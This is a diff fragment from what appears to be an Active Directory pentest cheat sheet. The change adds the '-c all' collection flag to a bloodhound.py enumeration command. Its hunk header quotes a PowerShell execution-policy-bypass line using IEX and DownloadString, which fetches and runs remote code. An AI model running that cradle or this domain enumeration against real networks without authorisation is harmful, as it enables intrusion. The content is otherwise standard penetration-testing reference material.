@@ -16,7 +16,7 @@ powershell.exe -exec Bypass -C "IEX(New-Object Net.Webclient).DownloadString(‘
 
 If it's possible, execute SharpHound. On Linux, you can use the python version. More information here : https://github.com/BloodHoundAD/SharpHound and https://github.com/fox-it/BloodHound.py
 ```markdown
-python3 bloodhound.py -u XXX -dc DOMAIN
+python3 bloodhound.py -u XXX -dc DOMAIN -c all
 OR .\SharpHound.exe
 ```
 
